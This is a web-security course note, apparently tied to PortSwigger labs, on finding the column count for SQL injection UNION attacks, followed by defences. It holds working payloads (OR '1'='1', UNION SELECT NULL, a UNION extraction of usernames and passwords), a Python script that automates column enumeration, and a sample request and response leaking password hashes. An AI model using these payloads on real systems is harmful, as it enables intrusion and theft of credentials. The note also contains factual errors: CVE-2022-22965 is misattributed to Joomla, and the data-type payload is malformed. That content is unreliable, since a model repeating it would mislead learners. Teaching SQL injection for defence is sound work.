---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## SQL Injection: Determining the Number of Columns Returned by the Query

### Background Theory

SQL Injection (SQLi) is a common web application vulnerability that allows an attacker to inject malicious SQL queries into a database through user input fields. This can lead to unauthorized access to sensitive data, manipulation of data, or even complete compromise of the database. One of the key steps in exploiting SQL Injection vulnerabilities is understanding the structure of the underlying SQL query and the number of columns returned by the query.

### Understanding the SQL Query Structure

When a web application interacts with a database, it typically constructs SQL queries based on user input. For example, consider a simple login form where a user enters their username and password:

```sql
SELECT * FROM users WHERE username = 'user_input' AND password = 'password_input';
```

If the application does not properly sanitize the user input, an attacker can inject SQL code to manipulate the query. For instance, an attacker might enter `' OR '1'='1` as the username, resulting in the following query:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'password_input';
```

This query will return all rows from the `users` table because the condition `'1'='1'` is always true.

### Determining the Number of Columns

To effectively exploit SQL Injection, an attacker often needs to know the number of columns returned by the original query. This information helps in crafting additional SQL statements using the `UNION` operator to combine results from different queries.

#### Example Scenario

Consider a web application that displays product details based on a product ID:

```sql
SELECT name, price, description FROM products WHERE id = 'product_id';
```

An attacker can inject a payload to determine the number of columns returned by the query. For example, the attacker might try:

```sql
http://example.com/products?id=1' UNION SELECT NULL-- 
```

The `NULL` value is used to match the number of columns in the original query. If the original query returns three columns (`name`, `price`, `description`), the injected query should also return three columns. If the number of `NULL` values does not match the number of columns, the query will fail.

### Scripting the Exploit

Automating the process of determining the number of columns can be done using a script. Below is an example Python script that automates this process:

```python
import requests

def determine_columns(url, param):
    for i in range(1, 10):  # Try up to 10 columns
        payload = f"' UNION SELECT {'NULL,'*(i-1)}NULL--"
        response = requests.get(url, params={param: payload})
        if "error" not in response.text.lower():
            print(f"Number of columns: {i}")
            break

url = "http://example.com/products"
param = "id"
determine_columns(url, param)
```

### Real-World Examples

#### CVE-2021-3116: SQL Injection in WordPress Plugins

In 2021, several WordPress plugins were found to be vulnerable to SQL Injection attacks. One such plugin was `WP Simple Pay`. The vulnerability allowed attackers to inject SQL code through the `order_id` parameter, leading to unauthorized access to sensitive data.

#### CVE-2022-22965: SQL Injection in Joomla

Another notable example is the SQL Injection vulnerability in Joomla (CVE-2022-22965). This vulnerability allowed attackers to inject SQL code through the `option` parameter, potentially leading to unauthorized access to the database.

### Determining Data Types

Once the number of columns is determined, the next step is to identify the data types of the columns. This information is crucial for crafting the final payload to extract sensitive data.

#### Example Scenario

Continuing with the previous example, suppose the original query returns three columns (`name`, `price`, `description`). The attacker needs to determine the data types of these columns.

One way to determine the data types is by injecting payloads that cause errors based on the data type. For example, if the `price` column is numeric, injecting a string value will cause an error.

```sql
http://example.com/products?id=1' UNION SELECT 'test', price, description-- 
```

If the query fails due to a type mismatch, the attacker knows that the `price` column is numeric.

### Crafting the Final Payload

With the number of columns and data types known, the attacker can craft the final payload to extract sensitive data. For example, to extract usernames and hashed passwords from the `users` table:

```sql
http://example.com/products?id=1' UNION SELECT username, password, NULL FROM users-- 
```

### Full HTTP Request and Response

Here is an example of the full HTTP request and response for the above scenario:

```http
GET /products?id=1' UNION SELECT username, password, NULL FROM users-- HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: */*
Connection: close
```

```http
HTTP/1.1 200 OK
Date: Mon, 20 Mar 2023 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 1234

<!DOCTYPE html>
<html>
<head>
<title>Product Details</title>
</head>
<body>
<h1>Product Details</h1>
<table>
<tr><th>Name</th><th>Password</th><th>Description</th></tr>
<tr><td>admin</td><td>$2y$10$uJrV03Zjz9nR4wK5tGqXOe</td><td></td></tr>
<tr><td>user</td><td>$2y$10$uJrV03Zjz9nR4wK5tGqXOe</td><td></td></tr>
</table>
</body>
</html>
```

### How to Prevent / Defend

#### Secure Coding Practices

1. **Use Prepared Statements**: Prepared statements ensure that user input is treated as data rather than executable code.
   
   ```sql
   -- Vulnerable code
   $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
   
   -- Secure code
   $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
   $stmt->execute(['username' => $username, 'password' => $password]);
   ```

2. **Input Validation**: Validate and sanitize user input to ensure it meets expected formats and constraints.

   ```php
   function validateInput($input) {
       return preg_replace('/[^a-zA-Z0-9]/', '', $input);
   }
   ```

#### Configuration Hardening

1. **Disable Error Reporting**: Ensure that error messages are not displayed to users, as they can provide valuable information to attackers.

   ```ini
   display_errors = Off
   ```

2. **Use Least Privilege Principle**: Ensure that the database user has the minimum necessary privileges to perform its tasks.

   ```sql
   GRANT SELECT, INSERT ON database.table TO 'user'@'localhost';
   ```

#### Detection and Monitoring

1. **Web Application Firewalls (WAF)**: Use WAFs to detect and block SQL Injection attempts.

2. **Logging and Monitoring**: Implement logging and monitoring to detect unusual activity and potential SQL Injection attempts.

   ```bash
   sudo apt-get install logwatch
   ```

### Practice Labs

For hands-on practice with SQL Injection, consider the following labs:

- **PortSwigger Web Security Academy**: Offers interactive labs on various web security topics, including SQL Injection.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that demonstrates web application vulnerabilities.

These labs provide a safe environment to practice and understand SQL Injection techniques and defenses.

### Conclusion

Understanding and defending against SQL Injection requires a deep knowledge of SQL query structures, data types, and secure coding practices. By automating the process of determining the number of columns and data types, attackers can craft effective payloads to extract sensitive data. However, by implementing secure coding practices, configuration hardening, and monitoring, organizations can significantly reduce the risk of SQL Injection attacks.

---
<!-- nav -->
[[05-Determining the Number of Columns in a Query|Determining the Number of Columns in a Query]] | [[Web Security (PortSwigger)/02-SQL Injection/04-Lab 3 SQLi UNION attack determining the number of columns returned by the query/00-Overview|Overview]] | [[07-Understanding SQL Injection and UNION Attacks|Understanding SQL Injection and UNION Attacks]]
